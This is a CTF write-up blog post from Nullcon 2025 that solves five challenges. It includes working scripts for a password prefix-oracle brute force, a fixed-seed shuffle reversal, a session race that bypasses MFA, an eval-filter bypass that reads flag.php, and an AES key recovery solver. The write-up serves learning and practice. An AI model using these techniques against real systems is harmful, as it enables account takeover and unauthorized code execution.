---
title: "Nullcon 2025"
date: 2025-09-07
description: "A full writeup of my first Nullcon 2025 CTF, covering five challenges across Web and Crypto. Includes detailed recon, exploit steps, scripts, and key takeaways from each challenge."
featured_image: "/posts/CTF/NULLCON/CTF.png"
categories: ["CTF Writeups", "Nullcon 2025"]
author: 'Koustubha naik (Z3KAIx0)'
excerpt: " This writeup recaps my first Nullcon CTF journey — from solving quirky web challenges to breaking crypto puzzles — with step-by-step exploits, scripts, and lessons learned "

# Data for the summary table at the top of the page
challenges:
  - title: "Grandmas_notes"
    cat: "Web"
    points: 100
    solved: true
    anchor: "web-grandmas-notes-100"

  - title: "pwgen"
    cat: "Web"
    points: 100
    solved: true
    anchor: "web-pwgen-100"

  - title: "webby"
    cat: "Web"
    points: 203
    solved: true
    anchor: "web-webby-203"

  - title: "Slasher"
    cat: "Web"
    points: 275
    solved: true
    anchor: "web-slasher-275"

  - title: "Power Tower"
    cat: "Crypto"
    points: 100
    solved: true
    anchor: "Powertower-100"
     
---

## Event meta
- **Name:** Z3KAIx0
- **Score:** 779  
- **Placement:**  130th
- **Format:** 24h jeopardy  
- **Links:** [Event](https://ctf.nullcon.net/) 

---

<img src="/posts/CTF/NULLCON/nullcon-ctf.png" style="width:1000px;">

---
This was my first CTF competition, and I genuinely enjoyed the entire experience. I learned a lot of new things  — from exploring different categories of challenges . It was exciting, sometimes frustrating, but overall very rewarding. I came out of it with new skills, more confidence, and plenty of motivation to keep practicing and improving for the next competitions.🙃

---
<div id="web-grandmas-notes-100" style="text-align: center;">
  <h1>✨ 1. Grandmas_notes</h1>
</div>

---
<img src="/posts/CTF/NULLCON/grandmasnotes.png" style="width:500px;">

---

## Recon

* App had **Register** and **Login** forms.
* Dashboard allowed saving personal notes (`save_note.php`).
* Code snippet from `login.php` showed:

```php
$correct = 0;
$limit = min(count($chars), count($stored));
for ($i = 0; $i < $limit; $i++) {
    $enteredCharHash = sha256_hex($chars[$i]);
    if (hash_equals($stored[$i]['char_hash'], $enteredCharHash)) {
        $correct++;
    } else {
        break;
    }
}
$_SESSION['flash'] = "Invalid password, but you got {$correct} characters correct!";
```

* Meaning: **the login error reveals how many characters of the password are correct (prefix oracle).**

---

## Exploit — Password Oracle

We can brute-force the admin password one character at a time.

<video width="640" controls>
  <source src="/posts/CTF/NULLCON/output_10x.mp4" type="video/mp4">
  </video>


### Steps

1. Open `/login.php`.
2. Open browser **DevTools → Console**.
3. Paste this JS:

```js
(async () => {
  const USER = "admin";   // target account
  const CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-!@#$%^&*";
  const rx = /got\s+(\d+)\s+characters?\s+correct/i;

  async function score(pw) {
    const body = new URLSearchParams({ username: USER, password: pw }).toString();
    const r = await fetch("/login.php", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body,
      credentials: "include",
      cache: "no-store"
    });
    const text = await r.text();
    const m = text.match(rx);
    return m ? parseInt(m[1], 10) : 0;
  }

  let prefix = "";
  while (true) {
    let found = false;
    for (const ch of CHARSET) {
      const n = await score(prefix + ch);
      if (n === prefix.length + 1) {
        prefix += ch;
        console.log("[+] prefix =", prefix);
        found = true;
        break;
      }
    }
    if (!found) break;
    await new Promise(r => setTimeout(r, 150)); // small delay
  }
  console.log("DONE. Admin password =", prefix);
})();
```

4. This script brute-forces the password character by character and prints the result.

---

## Result

```
ENO{V1b3_C0D1nG_Gr4nDmA_Bu1ld5_InS3cUr3_4PP5!!}

```

<!-- ========================================================================================= -->

---
<div id="web-pwgen-100" style="text-align: center;">
  <h1>✨2. Pwgen</h1>
</div>

<img src="/posts/CTF/NULLCON/pwgen.png" style="width:500px;">

---

The site takes the secret flag (a line of letters like F L A G { ... }) and “shuffles” its letters using a machine that needs a starting number called a seed. They always use the same seed, 0x1337, so the shuffle pattern is always the same—like repeating the same dance steps each time. When you visit /?nthpw=N, it doesn’t keep reshuffling the last result; instead, it applies the N-th shuffle pattern from that same machine to the original flag and shows you that scrambled version.

This is weak because a fixed seed makes the pattern predictable, not truly random. If someone knows the seed (or can see it in the source), they can recreate the exact shuffle steps and then reverse those steps to put every letter back in its original place, revealing the real flag.

---

## Source highlights

```php
include "flag.php";
$shuffle_count = abs(intval($_GET['nthpw']));
srand(0x1337);
for ($i = 0; $i < $shuffle_count; $i++) {
    $password = str_shuffle($FLAG); // shuffle original each time (RNG advances)
}
echo "Your password is: '$password'";
```

**Key issues**

* Fixed RNG seed ⇒ predictable “random”.
* Each iteration shuffles the **original** `$FLAG` (not the previous result), so the N-th output corresponds to the N-th permutation of the same string.

---

## Steps I did

1. **Fetch a shuffled sample** (picked `N=1`):

   ```bash
   curl 'http://52.59.124.14:5003/?nthpw=1'
   ```

   → Got a shuffled string.

---
<img src="/posts/CTF/NULLCON/nthpw.png" style="width:1500px;">

---

2. **Recreate the server’s permutation locally** using the same seed and Fisher–Yates logic.

3. **Invert the permutation** to “unshuffle” the server’s output back to the original flag.

---

## One-liner used (PHP)

```bash
php -r 'srand(0x1337); $N=1; $s="PASTE_SHUFFLED_STRING_HERE"; $L=strlen($s);
for($k=0;$k<$N;$k++){ $p=range(0,$L-1); for($i=$L-1;$i>0;$i--){ $j=rand(0,$i); [$p[$i],$p[$j]]=[$p[$j],$p[$i]]; } }
$o=array_fill(0,$L,"\0"); for($pos=0;$pos<$L;$pos++){ $o[$p[$pos]]=$s[$pos]; } echo implode("",$o),"\n";'
```

---

## Why it works (short)

* Fixed seed ⇒ same RNG sequence every time.
* N-th call to `str_shuffle()` ⇒ **known** N-th permutation.
* Inverting that permutation restores the original index order ⇒ original flag.

---

## Flag

```
ENO{N3V3r_SHUFFLE_W1TH_STAT1C_S333D_OR_B4D_TH1NGS_WiLL_H4pp3n:-/_0d68ea85d88ba14eb6238776845542cf6fe560936f128404e8c14bd5544636f7}
```
<!-- ========================================================================================= -->
---

<div id="web-webby-203" style="text-align: center;">
  <h1>✨3. Webby</h1>
</div>

<img src="/posts/CTF/NULLCON/webby.png" style="width:500px;">

---

## Recon

### Landing page

* Contains a login form.
* HTML comments leak test creds and a hint:

  ```html
  <!-- user: user1 / password: user1 -->
  <!-- user: user2 / password: user2 -->
  <!-- user: admin / password: admin -->
  <!-- Find me secret here: /?source -->
  ```
* `user1:user1` and `user2:user2` → login succeeds but empty content.
* `admin:admin` → **redirects to `/mfa`** (admin requires MFA).
* Probing `/flag` or `/secret` unauthenticated → redirects to `/` (or “not found”).

---

Visiting `/?source=1` dumps the real app (web.py). Key routes:

```python
urls = ('/', 'index', '/mfa', 'mfa', '/flag', 'flag', '/logout', 'logout')
session = web.session.Session(app, web.session.ShelfStore(shelve.open("/tmp/session.shelf")))
FLAG = open("/tmp/flag.txt").read()
```

### Login handler (core flaw)

```python
class index:
    def POST(self):
        # ... form validates, creds ok ...
        session.loggedIn = True
        session.username = i.username
        session._save()                       # (1) loggedIn=True saved

        if check_mfa(session.get("username", None)):   # admin => True
            session.doMFA = True
            session.tokenMFA = hashlib.md5(
                bcrypt.hashpw(str(secrets.randbits(random.randint(40,65))).encode(),
                               bcrypt.gensalt(14))
            ).hexdigest()
            session.loggedIn = False
            session._save()                   # (2) flips back to False
            raise web.seeother("/mfa")
        return render.login(session.get("username",None))
```

### MFA + Flag

```python
class mfa:
    def POST(self):
        # token must match session.tokenMFA (32 hex); else /logout (kill session)
        if i.token != session.get("tokenMFA",None):
            raise web.seeother("/logout")
        session.loggedIn = True
        session._save()
        raise web.seeother('/flag')

class flag:
    def GET(self):
        if not session.get("loggedIn",False) or session.get("username",None) != "admin":
            raise web.seeother('/')
        else:
            session.kill()
            return render.flag(FLAG)
```

**Root cause:** During admin login, the app **first** saves `loggedIn=True` and **later** flips it to `False` for MFA. Because token generation uses **bcrypt (cost 14)**, there’s a measurable window between the two saves. Hitting `/flag` in that window with the **same session id** returns the flag.

---

## Exploitation

### Method A — **Browser console racer** (no cookie juggling)

Works because the browser automatically includes the current `webpy_session_id` (`HttpOnly`) on both requests.

Open the site, press F12 → **Console**, then paste:

```js
// Looks for ENO{...} while racing login vs flag in same session
(async () => {
  const sleep = ms => new Promise(r => setTimeout(r, ms));
  const delays = [0,10,20,30,40,60,80,120,160,200]; // tweak if needed

  while (true) {
    // 1) Start admin login (do not await -> we want overlap)
    fetch("/", {
      method: "POST",
      headers: {"Content-Type": "application/x-www-form-urlencoded"},
      body: "username=admin&password=admin",
      credentials: "include"
    });

    // 2) Probe /flag at several offsets during bcrypt work
    for (const d of delays) {
      await sleep(d);
      const resp = await fetch("/flag", {credentials: "include", cache: "no-store"});
      const text = await resp.text();
      const m = text.match(/ENO\{[^}]+\}/);
      if (m) {
        console.log("FLAG:", m[0]);
        console.log(text); // whole page if desired
        return;
      }
    }
  }
})();
```

**Result:**

<img src="/posts/CTF/NULLCON/webby1.png" style="width:1500px;">


```
FLAG: ENO{R4Ces_Ar3_3ver1Wher3_Y3ah!!}
```

> If it doesn’t pop quickly, re-run or adjust delays (e.g., add 250–400ms). Don’t manually navigate to `/mfa` during the race.

<!-- ========================================================================================= -->

---

<div id="web-slasher-275" style="text-align: center;">
  <h1>✨4. Slasher</h1>
</div>

<img src="/posts/CTF/NULLCON/slasher.png" style="width:500px;">

---

<img src="/posts/CTF/NULLCON/slasher1.png" style="width:1500px;">

---

## Provided source (key parts)

```php
if(isset($_POST['input']) && is_scalar($_POST['input'])) {
    $input = $_POST['input'];
    $input = htmlentities($input, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    $input = addslashes($input);
    $input = addcslashes($input, '+?<>&v=${}%*:.[]_-0123456789xb `;');
    try {
        $output = eval("$input;");
    } catch (Exception $e) {}
}
...
<?php if($output) { ?>
  <div class="result" id="resultText"><?php echo htmlentities($output); ?></div>
<?php } ?>
```

### What the filters do

* `htmlentities()` nukes quotes/HTML meta chars.
* `addslashes()` escapes `\ ' " NUL`.
* `addcslashes(..., '+?<>&v=${}%*:.[]_-0123456789xb \`;)\` escapes:

  * **space**, **digits 0–9**, `$`, `{}`, `=`, `+`, `.`, `_`, `-`, `:`, `;`, `%`, `*`, `[ ]`, `< >`, **letters `v`, `x`, `b`**, backtick.
* Then it runs: `eval("$input;")`.

### Consequences

* **Variables** like `$FLAG` are blocked (the `$` is escaped).
* You can’t type **digits**, **quotes**, **spaces**, `"."`, **underscore**, etc.
* But you *can* still use **letters, commas, and parentheses** → function calls like `print()`, `file()`, `implode()`, `array()`, `chr()`, `count()`.

Also note: the page only renders the “result” `<div>` when `$output` is **truthy**. `print()` returns `1`, so it guarantees that block shows.

---

## Recon / Sanity check

Prove code execution without using blocked characters:

```bash
curl -s -X POST -d 'input=return(true)' http://52.59.124.14:5011/ \
| sed -n 's/.*id="resultText">\([^<]*\).*/\1/p'
# -> 1
```

This shows our expression is being `eval()`’d.

Tried the obvious constant leak:

```bash
curl -s -X POST -d 'input=return(FLAG)' http://52.59.124.14:5011/
curl -s -X POST -d 'input=return(flag)' http://52.59.124.14:5011/
```

No flag → likely the flag is **not** a constant, but in `flag.php` as a variable (e.g., `$FLAG`), which we can’t access directly due to `$` being blocked.

---

## Exploit idea

We can’t type `"flag.php"` (quotes/digits/`.` blocked), so we **synthesize** it:

* `array(true,true,true)` → `count(...) = 3`
* `chr(70)` → `'F'` (but we can’t type `70`)
* So we build **every character** via `chr(count(array(true,…)))`
* Then `implode(array(...))` joins characters into the string.

With that, we can do:

```php
print(implode(file("flag.php")));
```

…but written **only** with allowed tokens.

---

## Exploit (one-liner)

```bash
URL="http://52.59.124.14:5011/"

PAYLOAD=$(python3 - <<'PY'
def enc(s):
    def block(n): return "true,"*(n-1)+"true"
    parts = [f"chr(count(array({block(ord(c))})))" for c in s]
    return "implode(array(" + ",".join(parts) + "))"
code = f"print(implode(file({enc('flag.php')})))"
print(code)
PY
)

curl -s -X POST --data-urlencode "input=$PAYLOAD" "$URL" | grep -o 'ENO{[^}]*}'
```

**Output:**

<img src="/posts/CTF/NULLCON/slasher2.png" style="width:1200px;">


```
ENO{3v4L_0nC3_Ag41n_F0r_Th3_W1n_:-)}
```

Why `grep`? `print()` writes the file’s contents into the HTML (outside the `resultText` div), so we scrape the flag from the whole page.

---

## Why it works (super short)

* Filters block **typing** dangerous characters, but not **using** safe functions.
* With letters+parentheses only, we can still call `chr/count/array/implode/file/print`.
* Build `"flag.php"` using counts of `true`; read and print it.
* `eval` happily executes the expression.

---


## Credits / Notes

* Trick sometimes called “**array(true) counter / chr synthesis**”.
* Works in many languages/sandboxes where you can still call a few safe functions and build strings without quotes/digits.

<!-- ========================================================================================= -->


<div id="Powertower-100" style="text-align: center;">
  <h1>✨5.Power Tower</h1>
</div>

<img src="/posts/CTF/NULLCON/powertower.png" style="width:500px;">
---
<img src="/posts/CTF/NULLCON/powertower1.png" style="width:1500px;">
---

## What’s happening?

* `primes = {2,3,5,...,97}` (all primes < 100).
* A **left-fold power tower** is built:

  * `t0 = 1`
  * `t1 = 2^t0 = 2`
  * `t2 = 3^t1 = 3^2`, …
  * `t25 = 97^(…^(…))` = `int_key`
* AES-256 key = the 32-byte big-endian representation of `int_key mod n`.
* The flag is padded with `_` to a multiple of 16 and encrypted with **AES-ECB**.

We only need **`int_key mod n`**.

---

## Math trick (how to get the key without the flag)

1. **Factor `n`** (it’s not random here):

   ```
   n =
   127
   × 841705194007
   × 1005672644717572752052474808610481144121914956393489966622615553
   ```

   (Two smallish primes and one large prime.)

2. Compute the tower **mod each prime factor**. Use:

   * **Carmichael’s function** `λ(p^k)` to reduce exponents modulo the multiplicative order.
   * For the tower, the exponents are enormous after the first level, so we **add `λ`** to keep exponents within the correct cycle.
   * **Prime-power short-circuit:** if base shares a factor with `p^k`, then `a^e ≡ 0 (mod p^k)` for large enough `e`.

3. Combine the three residues with the **Chinese Remainder Theorem (CRT)** → `int_key % n`.

4. Convert to 32 bytes → **AES key**.

5. **Decrypt** the ciphertext in `cipher.txt` with AES-ECB, then strip trailing underscores.

---

## Solver

> Save as `solve.py` next to `cipher.txt`.

```py
# solve.py — rebuild AES key (int_key mod n) and decrypt cipher.txt

from Crypto.Cipher import AES
from math import gcd
from functools import reduce
from sympy import factorint, isprime

# Inputs from chall.py / cipher.txt
n = 107502945843251244337535082460697583639357473016005252008262865481138355040617
C_hex = open("cipher.txt","r").read().strip()

# primes < 100
PRIMES = [2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97]

# Factorization of n (primes)
FACTORS_N = [
    127,
    841705194007,
    1005672644717572752052474808610481144121914956393489966622615553
]

def lcm(a,b): return a // gcd(a,b) * b
def lcm_many(xs): return reduce(lcm, xs, 1)

def carmichael_lambda_from_factorint(factors: dict) -> int:
    # λ(p^k): odd p => p^(k-1)(p-1); for 2: 1,2,2^(k-2) (k>=3)
    parts = []
    for p, k in factors.items():
        if p == 2:
            if k == 1: parts.append(1)
            elif k == 2: parts.append(2)
            else: parts.append(1 << (k-2))
        else:
            parts.append((p**(k-1)) * (p-1))
    return lcm_many(parts)

def crt_pair(a1, m1, a2, m2):
    # x ≡ a1 (mod m1), x ≡ a2 (mod m2), coprime moduli
    def eg(a, b):
        if b == 0: return (1, 0, a)
        x, y, g = eg(b, a % b)
        return (y, x - (a // b) * y, g)
    assert gcd(m1, m2) == 1
    s, t, g = eg(m1, m2)
    x = (a1 * t * m2 + a2 * s * m1) % (m1*m2)
    return x, m1*m2

def crt_many(residues, moduli):
    x, m = residues[0], moduli[0]
    for a, mod in zip(residues[1:], moduli[1:]):
        x, m = crt_pair(x, m, a, mod)
    return x

def tower_mod(primes, m):
    """
    Left-fold tower modulo m:
      t0=1; t_i = primes[i-1] ** t_{i-1}
    Use Carmichael reductions and prime-power short-circuits.
    """
    if m == 1: return 0
    if not primes: return 1 % m

    a = primes[-1]
    prev = primes[:-1]

    fac = factorint(m)
    residues = []
    moduli = []

    for p, k in fac.items():
        mk = p**k
        if a % p == 0:
            if len(prev) == 0:
                res = a % mk
            else:
                res = 0  # exponent huge ⇒ a^e ≡ 0 (mod p^k)
        else:
            lam = carmichael_lambda_from_factorint({p: k})
            e = tower_mod(prev, lam)
            if len(prev) >= 1:
                e += lam  # keep exponent in the large cycle
            res = pow(a, e, mk)
        residues.append(res)
        moduli.append(mk)

    return crt_many(residues, moduli)

# Sanity: factors are prime
for pfac in FACTORS_N:
    assert isprime(pfac)

# int_key % n by CRT over prime factors
residues = [tower_mod(PRIMES, pfac) for pfac in FACTORS_N]
int_key_mod_n = crt_many(residues, FACTORS_N)

# 32-byte big-endian key
key = int_key_mod_n.to_bytes(32, 'big')

# Decrypt
cipher = bytes.fromhex(C_hex)
pt = AES.new(key, AES.MODE_ECB).decrypt(cipher)
flag = pt.rstrip(b'_').decode('utf-8', 'ignore')
print("Flag:", flag)
```

### Run

```bash
python3 -m pip install pycryptodome sympy
python3 solve.py
```

**Output**

---
<img src="/posts/CTF/NULLCON/powertower2.png" style="width:1500px;">

```
Flag: ENO{m4th_tr1ck5_c4n_br1ng_s0me_3ffic13ncy}
```

---

## Why it works (intuitive)

* You only care about `int_key (mod n)`.
* If `n = p1 * p2 * p3` (primes), compute `int_key (mod p1)`, `int_key (mod p2)`, `int_key (mod p3)` separately.
* Exponent arithmetic modulo a prime power uses **Carmichael’s function** to shrink the exponent (recursively).
* When base shares a factor with `p^k`, big exponents collapse to **0 mod p^k**.
* CRT stitches the residues back into a single value modulo `n`.
* Turn that into 32 bytes → AES-256 key. Decrypt with AES-ECB.

---

## Lessons learned

* **Never** try to compute monster towers directly—**work modulo** small factors.
* **Carmichael/Euler reductions** and **CRT** are must-know tools in crypto CTFs.
* AES-ECB has **no IV**; once the key is known, decryption is trivial.
* Custom padding (`'_'`) is easy to strip after decrypting.

---

## Credit / Tools

* Python, `pycryptodome` (AES), `sympy` (factorization utilities).
* Classic number theory: Carmichael λ, CRT.

```
```
<!-- ========================================================================================= -->
<!-- ========================================================================================= -->
<!-- ========================================================================================= -->

*Last updated:* 07 Sep 2025



